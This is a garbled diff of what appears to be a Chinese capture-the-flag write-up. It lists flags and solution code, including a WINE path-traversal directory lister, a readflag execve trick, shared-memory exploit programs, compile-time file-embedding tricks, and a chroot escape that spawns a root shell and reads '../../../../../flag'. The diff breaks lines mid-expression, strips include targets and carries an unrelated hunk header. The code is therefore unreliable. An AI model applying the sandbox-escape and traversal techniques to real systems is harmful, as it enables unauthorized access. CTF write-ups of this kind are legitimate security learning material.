@@ -24,17 +24,7 @@ java免杀合集
 
 ```
 flag{it_works_like_magic_e2a53e77e7}
-```
-
-
-
-```
 self.info['scrambled'] and self.info['pc'] == self.info['lb'] and len(self.info['inbits']) > 0 and self.info['ib'] < 0
-```
-
-
-
-```
 async def handle_input_on_change(self, message):
         try:
             inbits = list(map(int, message.sender.value))
@@ -46,16 +36,13 @@ async def handle_input_on_change(self, message):
                 self.watch_pc(0)
             else:
                 self.pc = 0
-        except:
+        
+except:
             pass
-```
-
-
-
-```
 def watch_pc(self, index):
         self.board.reset()
-        for branch in self.branches[:index]:
+        for branch in self.branches[:
+index]:
             self.board.move(branch[1] if self.inbits[branch[0]] else branch[2])
         for i in range(16):
             self.blocks[i].set_i(self.board.b[i//4][i % 4])
@@ -80,11 +67,6 @@ def watch_pc(self, index):
     async def action_next(self):
         if self.pc < len(self.branches):
             self.pc += 1
-```
-
-
-
-```
 class Board:
     def __init__(self):
         self.b = [[i*4+j for j in range(4)] for i in range(4)]
@@ -122,11 +104,6 @@ class Board:
                 if self.b[i][j] != i*4 + j:
                     return True
         return False
-```
-
-
-
-```
 # 前面先把源码 cp 一份
 bitlength = 16
 with open('chals/b16_obf.json') as f:
@@ -144,31 +121,17 @@ for i in range(0b1111111111111111):
     bp_app.inbits = inbits
 
     bp_app.board.reset()
-    for branch in bp_app.branches[:len(bp_app.branches)]:
+    for branch in bp_app.branches[:
+len(bp_app.branches)]:
         bp_app.board.move(branch[1] if bp_app.inbits[branch[0]] else branch[2])
     result = bool(bp_app.board)
     if result:
         print(f"[!] ===================================> {msg}")
         print(bp_app.board.b)
         break
-```
-
-
-
-```
 flag{Branching_Programs_are_NC1_98bbe61f17}
-```
-
-
-
-```
 flag{easy_to_use_bindiff_7a230a956b}
-```
-
-
-
-```
-#include <stdio.h>
+    #include <stdio.h>
 int main()
 {
     FILE *fp= NULL;
@@ -184,17 +147,7 @@ int main()
 
     return 0;
 }
-```
-
-
-
-```
 flag{the_compiler_is_my_eyes_7e7daa9a37}
-```
-
-
-
-```
 def check_excutable(path, input, ans, timeout):
     if not os.path.isfile(path):
         return 'CE'
@@ -207,7 +160,8 @@ def check_excutable(path, input, ans, timeout):
             stderr=subprocess.STDOUT,
             timeout=timeout
         )
-    except subprocess.TimeoutExpired:
+    
+except subprocess.TimeoutExpired:
         return 'TLE'
 
     if p.returncode != 0:
@@ -215,16 +169,12 @@ def check_excutable(path, input, ans, timeout):
 
     try:
         output = p.stdout.decode()
-    except UnicodeDecodeError:
+    
+except UnicodeDecodeError:
         return 'WA'
 
     lines = output.strip().split('n')
     return 'AC' if lines == ans else 'WA'
-```
-
-
-
-```
 const char * vogon_poem = R"V0G0N(
              O freddled gruntbuggly thy micturations are to me
                  As plured gabbleblochits on a lurgid bee.
@@ -235,29 +185,19 @@ Or I will rend thee in the gobberwarts with my blurlecruncheon, see 
                 (by Prostetnic Vogon Jeltz; see p. 56/57)
 )V0G0N";
 const char * vogon_poem = R"( ... )";
-```
-
-
-
-```
-#define STRINGIFY(...) #__VA_ARGS__
-#define STR(...) STRINGIFY(__VA_ARGS__)
+    #define STRINGIFY(...) #__VA_ARGS__
+    #define STR(...) STRINGIFY(__VA_ARGS__)
 // #define STR(x) #x
 
 const char* dynamic0_in = 
-#include "../data/dynamic0.in"
+    #include "../data/dynamic0.in"
 ;
-```
-
-
-
-```
 $ objcopy --input binary 
           --output elf32-i386 
           --binary-architecture i386 data.txt data.o
 
 ////////////////////////////
-#include <stdio.h>
+    #include <stdio.h>
 
 /* here "data" comes from the filename data.o */
 extern "C" char _binary_data_txt_start;
@@ -269,17 +209,12 @@ main()
 
     while ( p != &_binary_data_txt_end ) putchar(*p++);
 }
-```
-
-
-
-```
 $ cat t1.c
 __attribute__((section("some_array"))) int a[] = {1, 2, 3};
 $ cat t2.c
 __attribute__((section("some_array"))) int b[] = {4, 5, 6};
 $ cat t.c
-#include <stdio.h>
+    #include <stdio.h>
 
 extern const int __start_some_array;
 extern const int __stop_some_array;
@@ -299,14 +234,9 @@ some_array[2] = 3
 some_array[3] = 4
 some_array[4] = 5
 some_array[5] = 6
-```
+    #include 
 
-
-
-```
-#include <iostream>
-
-#define EMBED_STR(name, path)                
+    #define EMBED_STR(name, path)                
   extern const char name[];                  
   asm(".section .rodata, "a", @progbitsn" 
       #name ":n"                            
@@ -317,20 +247,16 @@ some_array[5] = 6
 EMBED_STR(kCurSourceFile, "example.cpp");
 
 int main() {
-  std::cout << kCurSourceFile;
+  std::
+cout << kCurSourceFile;
   return 0;
 }
-```
+    #include <stdio.h>
+    #include <string.h>
+    #include <sys/stat.h>
+    #include <stdlib.h>
 
-
-
-```
-#include <stdio.h>
-#include <string.h>
-#include <sys/stat.h>
-#include <stdlib.h>
-
-#define EMBED_STR(name, path)                              
+    #define EMBED_STR(name, path)                              
     extern const char name[];                              
     asm(".section .rodata, "a", @progbitsn" #name ":n" 
         ".incbin "" path ""n"                           
@@ -406,24 +332,14 @@ int main()
     fclose(fp);
     return 0;
 }
-```
-
-
-
-```
 Error: unknown pseudo-op: `.previous'
 flag{cpp_need_P1040_std_embed_...}
-```
+    #define _CRT_SECURE_NO_WARNINGS
 
-
-
-```
-#define _CRT_SECURE_NO_WARNINGS
-
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <Windows.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include <Windows.h>
 
 // Recursive是1表示递归查找，否则就只列出本级目录
 int ListDirectory(char* Path, int Recursive)
@@ -498,11 +414,6 @@ int main()
     ListDirectory(Path, 0);
     return 0;
 }
-```
-
-
-
-```
 ..\.
 ..\..
 ..\.dockerenv
@@ -526,14 +437,9 @@ int main()
 ..\tmp
 ..\usr
 ..\var
-```
-
-
-
-```
-#include <windows.h>
-#include <stdio.h>
-#include <stdlib.h>
+    #include <windows.h>
+    #include <stdio.h>
+    #include <stdlib.h>
 
 int main() {
     printf("Hello, world!n");
@@ -551,31 +457,14 @@ int main() {
     printf("2333");
     return 0;
 }
-```
-
-
-
-```
 gcc exp1.c -o exp1
-```
-
-
-
-```
 flag{Surprise_you_can_directory_traversal_1n_WINE_bb5da913e0}
-```
-
-
-
-```
 wine: Unhandled page fault on read access to 0000000000000050 at address 000000007BC52BA7 (thread 0009), starting debugger...
-0009:err:seh:start_debugger Couldn't start debugger L"winedbg --auto 8 44" (2)
+0009:
+err:
+seh:
+start_debugger Couldn't start debugger L"winedbg --auto 8 44" (2)
 Read the Wine Developers Guide on how to set up winedbg or another debugger
-```
-
-
-
-```
 import subprocess
 import base64
 
@@ -596,7 +485,8 @@ if __name__ == "__main__":
             "WINEPREFIX": "/wine"
         }
     )
-    stdout = output.stdout[:8192].decode()
+    stdout = output.stdout[:
+8192].decode()
     stderr = output.stderr.decode()
     print("stdout (标准输出，前 8192 个字节):")
     print(stdout)
@@ -624,17 +514,13 @@ if __name__ == "__main__":
                 print(i)
                 limit -= len(i_bytes)
             else:
-                i = i_bytes[:limit].decode()
+                i = i_bytes[:
+limit].decode()
                 print(i)
                 exit(0)
-```
-
-
-
-```
-#include <windows.h>
-#include <stdio.h>
-#include <tchar.h>
+    #include <windows.h>
+    #include <stdio.h>
+    #include <tchar.h>
 
 void _tmain( int argc, TCHAR *argv[] )
 {
@@ -676,26 +562,16 @@ void _tmain( int argc, TCHAR *argv[] )
     CloseHandle( pi.hProcess );
     CloseHandle( pi.hThread );
 }
-```
-
-
-
-```
-#include <unistd.h>
+    #include 
 
 int main() {
     execve("\\?\unix\readflag", NULL, NULL);
     return 0;
 }
-```
-
-
-
-```
-#include <stdio.h>
-#include <stdlib.h>
-#include <time.h>
-#include <string.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <time.h>
+    #include <string.h>
 
 double rand01()
 {
@@ -745,15 +621,10 @@ int main()
     else printf("胜败乃兵家常事，大侠请重新来过吧！n");
     return 0;
 }
-```
-
-
-
-```
-#include <stdio.h>
-#include <stdlib.h>
-#include <time.h>
-#include <string.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <time.h>
+    #include <string.h>
 
 double rand01()
 {
@@ -793,35 +664,15 @@ int main(int argc, char **argv)
     }
     return 0;
 }
-```
-
-
-
-```
 FROM debian:11
 RUN apt update && apt -y upgrade && 
     apt install -y gcc && rm -rf /var/lib/apt/lists/*
 COPY monte_carlo.c /
 RUN gcc -O3 /monte_carlo.c -o /a.out
 CMD ["/a.out"]
-```
-
-
-
-```
 docker build -t monte_carlo .
 docker run --rm monte_carlo > data
-```
-
-
-
-```
 flag{raNd0m_nUmb34_a1wayS_m4tters_7a5614bb46}
-```
-
-
-
-```
 200474-200736 SPI: MOSI data: 66
 200752-201015 SPI: MOSI data: 6C
 201031-201293 SPI: MOSI data: 61
@@ -864,27 +715,17 @@ flag{raNd0m_nUmb34_a1wayS_m4tters_7a5614bb46}
 211336-211599 SPI: MOSI data: 7D
 211615-211876 SPI: MOSI data: B0
 211894-212156 SPI: MOSI data: E5
-```
-
-
-
-```
 flag{0K_you_goT_th3_b4sIc_1dE4_caRRy_0N}
-```
+    #include 
+    #include <stdlib.h>
+    #include <stdio.h>
+    #include <string.h>
+    #include <sys/shm.h>
 
+    #ifndef _SHMDATA_H_HEADER
+    #define _SHMDATA_H_HEADER
 
-
-```
-#include <unistd.h>
-#include <stdlib.h>
-#include <stdio.h>
-#include <string.h>
-#include <sys/shm.h>
-
-#ifndef _SHMDATA_H_HEADER
-#define _SHMDATA_H_HEADER
-
-#define TEXT_SZ 2048
+    #define TEXT_SZ 2048
 
 struct shared_use_st
 {
@@ -892,7 +733,7 @@ struct shared_use_st
     char text[TEXT_SZ]; // 记录写入 和 读取 的文本
 };
 
-#endif
+    #endif
 
 int main(int argc, char **argv)
 {
@@ -962,22 +803,17 @@ int main(int argc, char **argv)
     sleep(2);
     exit(EXIT_SUCCESS);
 }
-```
+    #include <stddef.h>
+    #include <sys/shm.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include 
+    #include <string.h>
 
+    #ifndef _SHMDATA_H_HEADER
+    #define _SHMDATA_H_HEADER
 
-
-```
-#include <stddef.h>
-#include <sys/shm.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <string.h>
-
-#ifndef _SHMDATA_H_HEADER
-#define _SHMDATA_H_HEADER
-
-#define TEXT_SZ 2048
+    #define TEXT_SZ 2048
 
 struct shared_use_st
 {
@@ -985,7 +821,7 @@ struct shared_use_st
     char text[TEXT_SZ]; // 记录写入 和 读取 的文本
 };
 
-#endif
+    #endif
 
 int main(int argc, char **argv)
 {
@@ -1054,24 +890,9 @@ int main(int argc, char **argv)
 
     exit(EXIT_SUCCESS);
 }
-```
-
-
-
-```
 gcc -o expAA expAA.c
 gcc -o expBB expBB.c
-```
-
-
-
-```
 flag{ChR00t_ISNOTFULL_1501AtiOn_4f5ca7cef7}
-```
-
-
-
-```
 int main() {
  int dir_fd, x;
  setuid(0);
@@ -1084,11 +905,6 @@ int main() {
  chroot(".");
  return execl("/bin/sh", "-i", NULL);
  }
-```
-
-
-
-```
 int main(){
  char buf[100]={};
  int fd1 = openat(3,"../../../../../flag",0);
